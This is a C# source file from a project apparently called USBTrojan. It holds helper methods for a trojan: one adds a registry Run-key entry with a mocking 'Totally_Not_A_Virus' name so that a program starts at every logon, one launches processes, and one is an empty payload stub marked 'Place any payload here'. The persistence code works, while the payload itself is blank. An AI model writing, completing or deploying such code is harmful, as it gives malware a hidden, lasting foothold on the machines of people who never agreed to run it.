using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace USBTrojan
{
    public class Tools
    {
        public static bool AddToAutorun(string path)
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue("Totally_Not_A_Virus._Trust_Me._" + GenerateRandomString(8), path);
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        public static string GenerateRandomString(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random(Guid.NewGuid().GetHashCode());
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        public static bool Start(string name, string args = "")
        {
            try
            {
                System.Diagnostics.Process.Start(name, args);
                return true;
            }
            catch { }
            return false;
        }
        public static void RunPayload(object state = null)
        {
            try
            {
                // Place any payload here
            }
            catch (Exception ex)
            {
                // Handle error
                Console.WriteLine(ex.Message);
            }
        }
    }
}
